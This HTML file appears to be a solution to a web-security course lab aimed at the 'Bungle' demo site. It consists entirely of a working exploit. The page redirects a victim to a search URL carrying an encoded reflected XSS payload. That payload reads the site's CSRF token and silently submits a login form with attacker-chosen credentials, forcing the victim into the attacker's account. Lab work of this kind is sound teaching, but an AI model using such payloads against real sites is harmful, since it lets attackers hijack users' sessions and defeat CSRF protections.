<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
  <script>
    var attackCode = 
      '<script>' +
      'var r=new XMLHttpRequest();' +
      'r.open("GET","/?csrfdefense=1&xssdefense=0",false);' +
      'r.send();' +
      'var p=new DOMParser();' +
      'var h=p.parseFromString(r.responseText,"text/html");' +
      'var tkn=h.querySelector("input[name=csrf_token]");' +
      'if(tkn){' +
        'var loginForm=document.createElement("form");' +
        'loginForm.method="POST";' +
        'loginForm.action="/login?csrfdefense=1&xssdefense=0";' +
        'loginForm.innerHTML=' +
          '\'<input type="hidden" name="username" value="attacker">\'+' +
          '\'<input type="hidden" name="password" value="l33th4x">\'+' +
          '\'<input type="hidden" name="csrf_token" value="\'+tkn.value+\'">\';' +
        'document.body.appendChild(loginForm);' +
        'loginForm.submit();' +
      '}' +
      '<\/script>';
    
    window.location.href = 'https://bungle.sysnet.ucsd.edu/search?xssdefense=0&q=' + encodeURIComponent(attackCode);
  </script>
</body>
</html>